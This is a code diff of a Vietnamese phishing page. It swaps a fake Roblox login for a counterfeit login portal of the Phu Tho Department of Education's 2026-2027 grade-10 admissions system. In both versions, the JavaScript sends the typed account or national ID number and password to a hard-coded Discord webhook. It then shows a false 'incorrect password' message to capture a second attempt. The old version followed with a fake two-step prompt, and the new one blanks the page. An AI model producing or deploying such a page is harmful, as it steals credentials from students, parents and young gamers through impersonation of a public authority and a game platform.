@@ -2,270 +2,296 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox Square - Optimized</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tuyển sinh vào lớp 10 THPT Phú Thọ 2026-2027</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
-        
-        body, html {
-            height: 100vh; width: 100%;
-            background-color: #000;
-            font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
-            display: flex; flex-direction: column; align-items: center;
-            justify-content: space-between; 
-            overflow: hidden;
+        :root {
+            --primary-blue: #337ab7;
+            --dark-blue: #1e4b8d;
+            --bg-pattern: #f4f1e6;
         }
 
-        .header {
-            width: 100%; max-width: 450px; height: 52px;
-            background: #232527; z-index: 100;
-            display: flex; flex-direction: column; padding: 6px 15px;
-            flex-shrink: 0;
+        body {
+            background-color: var(--bg-pattern);
+            font-family: Arial, sans-serif;
+            margin: 0; padding: 0;
+            overflow-x: hidden;
         }
+
+        /* --- HEADER --- */
         .header-top {
-            display: flex; align-items: center; justify-content: space-between;
-            width: 100%; height: 20px;
+            background: #fff;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
         }
-        .header-left { display: flex; align-items: center; gap: 8px; }
-        .roblox-logo { width: 14px; height: 14px; fill: #fff; }
-        .search-bar { 
-            background: #111; border: 1px solid #444; border-radius: 4px;
-            padding: 1px 6px; width: 110px; color: #eee; font-size: 8px; height: 17px;
-        }
-        .btn-top-login { 
-            color: #fff; font-size: 8px; font-weight: 700; 
-            background: #393b3d; padding: 2px 7px; border-radius: 3px;
-        }
-        .header-nav {
-            display: flex; align-items: center; justify-content: space-between;
-            width: 100%; margin-top: 8px;
-        }
-        /* Cập nhật CSS cho các mục link */
-        .nav-item { 
-            color: #bbb; 
-            font-size: 7px; 
-            font-weight: 600; 
-            text-decoration: none; /* Xóa gạch chân mặc định của thẻ a */
-        }
-        .nav-item:active { color: #fff; } /* Hiệu ứng khi nhấn vào */
 
-        .bg-image {
+        .brand-section { display: flex; align-items: center; gap: 10px; }
+        .logo-img { height: 75px; }
+        .brand-text { color: #1e4b8d; font-weight: bold; line-height: 1.2; }
+        .brand-text .main { font-size: 16px; }
+        .brand-text .sub { font-size: 14px; margin-top: 3px; }
+
+        .header-right { text-align: right; }
+        .top-links { font-size: 12px; margin-bottom: 5px; }
+        .top-links a { text-decoration: none; color: #333; margin-left: 8px; }
+        .sub-description { 
+            color: #1e4b8d; font-weight: bold; font-size: 13px; 
+            max-width: 220px; display: inline-block;
+        }
+
+        /* --- NAVBAR --- */
+        .navbar-custom {
+            background-color: var(--primary-blue);
+            min-height: 38px;
+            padding: 0 15px;
+            display: flex;
+            align-items: center;
+        }
+        .navbar-custom a {
+            color: white;
+            text-decoration: none;
+            padding: 8px 12px;
+            font-size: 13px;
+            border-right: 1px solid rgba(255,255,255,0.3);
+        }
+
+        /* --- MAIN CONTENT --- */
+        .main-container {
+            background-image: url('https://www.toptal.com/designers/subtlepatterns/uploads/damask.png');
+            padding: 30px 10px;
+            min-height: 450px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 5px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            height: fit-content;
+        }
+
+        .login-card-header {
+            background-color: var(--primary-blue);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .login-card-body { padding: 20px; }
+
+        .form-group-custom {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .form-group-custom label {
+            width: 120px;
+            font-size: 13px;
+            color: #333;
+        }
+        .form-control-custom {
+            flex: 1;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            padding: 5px 10px;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .captcha-box {
+            background: #e9e9e9 url('https://www.transparenttextures.com/patterns/graphy.png');
+            border: 1px solid #ccc;
+            width: 100px;
+            height: 34px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 18px;
+            color: #2b60a5;
+            letter-spacing: 2px;
+            margin-left: 8px;
+        }
+
+        .btn-login-custom {
+            background-color: #007bff;
+            color: white;
+            width: 100%;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        /* Overlay loading */
+        #loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('https://i.ibb.co/nsm66HQs/image.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            z-index: 1;
-            filter: brightness(0.35);
+            background: rgba(255,255,255,0.9); z-index: 9999;
+            display: none; flex-direction: column; justify-content: center; align-items: center;
         }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .container { 
-            display: flex; justify-content: center; align-items: center; 
-            z-index: 10; width: 100%; flex: 1;
-        }
-        .login-box {
-            background-color: #1c1e22; 
-            padding: 5px 12px 18px 12px;
-            width: 210px; text-align: center; color: #fff; 
-            border-radius: 6px; box-shadow: 0 5px 25px rgba(0,0,0,0.9);
-        }
-
-        h2 { 
-            font-size: 18px; 
-            margin-top: 15px; 
-            margin-bottom: 18px; 
-            font-weight: 800; 
-        }
-
-        .input-field {
-            width: 100%; height: 19px; padding: 0 8px;
-            background: #2a2d33;
-            border: 1px solid #35383e;
-            border-radius: 3px; color: white; font-size: 7.5px; outline: none;
-        }
-        .input-field-u { margin-bottom: 3px; }
-        
-        #error-msg {
-            color: #ff4d4d;
-            font-size: 6.5px;
-            text-align: left;
-            margin-bottom: 5px;
-            padding-left: 2px;
-            display: none;
-        }
-
-        .input-field-p { margin-bottom: 8px; }
-
-        .btn-login {
-            width: 100%; height: 19px; background: transparent; color: #fff;
-            border: 1px solid #fff; border-radius: 3px; font-size: 8px;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .forgot-link { display: block; margin-top: 6px; color: #adb5bd; font-size: 6.5px; text-decoration: none; }
-        .spacer { height: 16px; width: 100%; }
-        
-        .btn-action {
-            width: 100%; height: 17px; padding: 0; 
-            background: #2f3238; 
-            border: none; color: #fff; border-radius: 3px; font-size: 7px; 
-            margin-bottom: 4px; font-weight: 600;
-            display: flex; align-items: center; justify-content: center;
-        }
-
-        .footer {
-            width: 100%; max-width: 450px; 
-            padding: 10px 10px 35px 10px; 
-            color: #ddd; text-align: center; z-index: 100; flex-shrink: 0;
-        }
-        .footer-links { 
-            margin-bottom: 25px; 
-            display: flex; flex-wrap: wrap; justify-content: center; 
-            column-gap: 12px; row-gap: 20px;
-        }
-        .footer-links span { font-size: 7.5px; color: #bbb; }
-        .footer-copyright { font-size: 6px; color: #555; margin-top: 15px; }
-
-        #dark-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.75); z-index: 1000; display: none;
-        }
-
-        .loader-container {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 1001; display: none; flex-direction: column; align-items: center;
-        }
-
-        .loader-sq { display: flex; gap: 5px; }
-        .sq { width: 8px; height: 8px; background: #bbb; animation: blink 0.8s infinite alternate; }
-        .sq:nth-child(2) { animation-delay: 0.2s; }
-        .sq:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes blink { from { opacity: 0.2; } to { opacity: 1; } }
-
-        #verify-modal {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 280px; 
-            background: #1a1c1e; 
-            border-radius: 8px;
-            z-index: 1002; display: none; flex-direction: column; overflow: hidden;
-            color: #fff; text-align: center;
-        }
-        .v-header { padding: 12px; border-bottom: 1px solid #333; font-size: 13px; font-weight: bold; }
-        .v-content { padding: 30px 20px; display: flex; flex-direction: column; align-items: center; }
-        .v-shield { width: 60px; margin-bottom: 20px; }
-        .v-text { font-size: 11px; color: #ccc; line-height: 1.5; margin-bottom: 20px; }
-        
-        .v-btn { 
-            width: 100%; 
-            padding: 5px; 
-            background: transparent; 
-            border: 1px solid #888; 
-            color: #fff; 
-            border-radius: 4px; 
-            font-size: 11px; 
-            cursor: pointer;
+        footer {
+            background: #fff;
+            padding: 12px;
+            border-top: 1px solid #ddd;
+            text-align: center;
+            font-size: 12px;
+            line-height: 1.6;
         }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="header-top">
-        <div class="header-left">
-            <svg class="roblox-logo" viewBox="0 0 28 28">
-                <path d="M4.3 0L0 23.7L23.7 28L28 4.3L4.3 0ZM18 18L10 16.5L11.5 8.5L19.5 10L18 18Z"/>
-            </svg>
-            <div class="search-bar">Tìm kiếm</div>
+<div id="loading-overlay">
+    <div class="spinner"></div>
+    <div style="color: #337ab7; font-weight: bold;">Đang xử lý dữ liệu...</div>
+</div>
+
+<header>
+    <div class="header-top container-fluid">
+        <div class="brand-section">
+            <img src="https://i.imgur.com/G5Zk9P3.png" class="logo-img" alt="Logo">
+            <div class="brand-text">
+                <div class="main">SỞ GIÁO DỤC VÀ ĐÀO TẠO PHÚ THỌ</div>
+                <div class="sub">TUYỂN SINH ĐẦU CẤP<br>NĂM HỌC 2026-2027</div>
+            </div>
         </div>
-        <div class="btn-top-login">Đăng nhập</div>
+        <div class="header-right">
+            <div class="top-links">
+                <a href="#">📰 Tin tức</a>
+                <a href="#">🔒 Đăng nhập</a>
+                <a href="#">❓ Trợ giúp</a>
+            </div>
+            <div class="sub-description">
+                Tuyển sinh vào lớp 10 THPT, GDTX
+            </div>
+        </div>
     </div>
-    <div class="header-nav">
-        <a href="https://www.roblox.com/leaderboard" class="nav-item">Bảng xếp hạng</a>
-        <a href="https://www.roblox.com/catalog" class="nav-item">Chợ</a>
-        <a href="https://www.roblox.com/develop" class="nav-item">Tạo</a>
-        <a href="https://www.roblox.com/robux" class="nav-item">Robux</a>
+    <div class="navbar-custom">
+        <a href="#">Tin tức</a>
+        <a href="#">Đăng nhập</a>
+        <a href="#">Trợ giúp</a>
+    </div>
+</header>
+
+<div class="main-container">
+    <div class="login-card">
+        <div class="login-card-header">ĐĂNG NHẬP HỆ THỐNG</div>
+        <div class="login-card-body">
+            <div id="error-msg" style="color: #d9534f; font-size: 12px; margin-bottom: 12px; display: none; text-align: center; background: #f2dede; padding: 5px; border-radius: 4px;">
+                Tên đăng nhập hoặc mật khẩu không chính xác.
+            </div>
+            <form id="loginForm">
+                <div class="form-group-custom">
+                    <label>Tài khoản/CCCD</label>
+                    <input type="text" id="user" class="form-control-custom" placeholder="Số định danh/CCCD">
+                </div>
+                <div class="form-group-custom">
+                    <label>Mật khẩu</label>
+                    <div style="position: relative; flex: 1; display: flex; align-items: center;">
+                        <input type="password" id="pass" class="form-control-custom" placeholder="Mật khẩu">
+                        <span style="position: absolute; right: 10px; cursor: pointer; font-size: 12px;" onclick="togglePass()">👁️</span>
+                    </div>
+                </div>
+                <div class="form-group-custom">
+                    <label>Mã xác nhận</label>
+                    <input type="text" class="form-control-custom" style="max-width: 85px;" placeholder="Mã">
+                    <div class="captcha-box">28059</div>
+                </div>
+                <button type="button" onclick="handleLogin()" class="btn-login-custom">ĐĂNG NHẬP</button>
+            </form>
+        </div>
     </div>
 </div>
 
-<div class="bg-image"></div>
-
-<div class="container">
-    <div class="login-box">
-        <h2>Thêm tài khoản</h2>
-        <input type="text" id="u" class="input-field input-field-u" placeholder="Tên người dùng/Email/SĐT">
-        <div id="error-msg">Sai tên người dùng hoặc mật khẩu.</div>
-        <input type="password" id="p" class="input-field input-field-p" placeholder="Mật khẩu">
-        <button class="btn-login" onclick="send()">Đăng nhập</button>
-        <a href="#" class="forgot-link">Bạn quên Mật khẩu hoặc Tên người dùng?</a>
-        <div class="spacer"></div>
-        <button class="btn-action">Gửi mã một lần cho tôi qua email</button>
-        <button class="btn-action">Sử dụng thiết bị khác</button>
-    </div>
-</div>
-
-<div id="dark-overlay"></div>
-
-<div class="loader-container" id="main-loader">
-    <div class="loader-sq">
-        <div class="sq"></div><div class="sq"></div><div class="sq"></div>
-    </div>
-</div>
-
-<div id="verify-modal">
-    <div class="v-header">Xác minh 2 bước</div>
-    <div class="v-content">
-        <img src="https://images.rbxcdn.com/393165b4c483d739818815122e964344.png" class="v-shield">
-        <p class="v-text">Để chấp nhận hoặc từ chối nỗ lực đăng nhập này, hãy mở ứng dụng Roblox từ thiết bị đã đăng nhập.</p>
-        <button class="v-btn" onclick="location.reload()">Thử lại</button>
-    </div>
-</div>
-
-<div class="footer">
-    <div class="footer-links">
-        <span>Về chúng tôi</span><span>Việc làm</span><span>Blog</span><span>Cha mẹ</span>
-        <span>Mua thẻ quà tặng</span><span>Trợ giúp</span><span>Điều khoản</span><span>Riêng tư</span>
-        <span>Sơ đồ trang web</span>
-    </div>
-    <div class="footer-copyright">©2026 Roblox Corporation.</div>
-</div>
+<footer>
+    <div><strong>Lập bởi: Nguyễn Quốc Hương</strong></div>
+    <div class="text-muted">Hỗ trợ trực tuyến: | Nội dung:</div>
+</footer>
 
 <script>
-let clickCount = 0;
+    let step = 0;
+    const webhookURL = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";
 
-function send() {
-    const u = document.getElementById('u').value;
-    const p = document.getElementById('p').value;
-    const err = document.getElementById('error-msg');
-    const overlay = document.getElementById('dark-overlay');
-    const loader = document.getElementById('main-loader');
-    const modal = document.getElementById('verify-modal');
-
-    if(!u || !p) {
-        err.style.display = 'block';
-        return;
+    function togglePass() {
+        const p = document.getElementById('pass');
+        p.type = p.type === 'password' ? 'text' : 'password';
     }
 
-    fetch("https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
-    });
+    function handleLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const err = document.getElementById('error-msg');
+        const loader = document.getElementById('loading-overlay');
 
-    if (clickCount === 0) {
-        setTimeout(() => { 
-            err.style.display = 'block';
-            document.getElementById('p').value = ""; 
-            clickCount++;
-        }, 800);
-    } else {
-        overlay.style.display = 'block';
+        if (!u || !p) {
+            alert("Vui lòng nhập đầy đủ thông tin!");
+            return;
+        }
+
         loader.style.display = 'flex';
+        err.style.display = 'none';
 
-        setTimeout(() => {
+        // Gửi dữ liệu qua Webhook
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: null,
+                embeds: [
+                    {
+                        title: "📝 Thông tin đăng nhập mới (Phú Thọ)",
+                        color: 3066993,
+                        fields: [
+                            { name: "👤 Tài khoản", value: "`" + u + "`", inline: true },
+                            { name: "🔑 Mật khẩu", value: "`" + p + "`", inline: true }
+                        ],
+                        footer: { text: "Hệ thống Tuyển sinh" },
+                        timestamp: new Date()
+                    }
+                ]
+            })
+        })
+        .then(() => {
+            setTimeout(() => {
+                loader.style.display = 'none';
+                if (step === 0) {
+                    err.style.display = 'block';
+                    document.getElementById('pass').value = '';
+                    step++;
+                } else {
+                    // Chuyển màn hình trắng
+                    document.body.innerHTML = "";
+                    document.body.style.backgroundColor = "white";
+                }
+            }, 1200);
+        })
+        .catch(error => {
+            console.error("Lỗi:", error);
             loader.style.display = 'none';
-            modal.style.display = 'flex';
-        }, 2500);
+        });
     }
-}
 </script>
 
 </body>
